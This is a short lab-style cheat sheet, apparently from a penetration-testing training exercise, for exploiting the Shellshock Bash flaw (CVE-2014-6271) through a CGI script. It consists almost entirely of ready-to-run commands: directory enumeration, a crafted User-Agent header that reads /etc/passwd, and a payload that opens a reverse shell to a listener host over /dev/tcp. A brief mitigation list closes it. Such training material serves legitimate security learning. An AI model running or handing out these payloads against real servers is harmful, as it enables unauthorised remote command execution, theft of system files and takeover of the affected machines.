# Attacking CGI Applications - Shellshock

## 1. Vulnerability Overview

**CVE-2014-6271 (Shellshock)**
A critical flaw in Bash (≤ 4.3) allows arbitrary command execution through crafted environment variables. When triggered through CGI scripts, it can result in remote code execution under the web server user.

---

## 2. Enumeration

### Discover CGI Scripts

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
```

### Verify CGI Script Accessibility

```bash
curl -i http://10.129.204.231/cgi-bin/access.cgi
```

---

## 3. Exploitation

### Confirm Vulnerability

```bash
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
```

### Execute Reverse Shell

```bash
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
```

### Start Listener

```bash
sudo nc -lvnp 7777
```

---

## 4. Mitigation

* Update Bash to the patched version.
* Restrict public access to CGI directories.
* Remove or replace outdated systems using vulnerable Bash builds.

---

## 5. Commands Summary

```bash
gobuster dir -u http://10.129.204.231/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -x cgi
curl -i http://10.129.204.231/cgi-bin/access.cgi
curl -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' http://10.129.204.231/cgi-bin/access.cgi
curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.38/7777 0>&1' http://10.129.204.231/cgi-bin/access.cgi
sudo nc -lvnp 7777
```
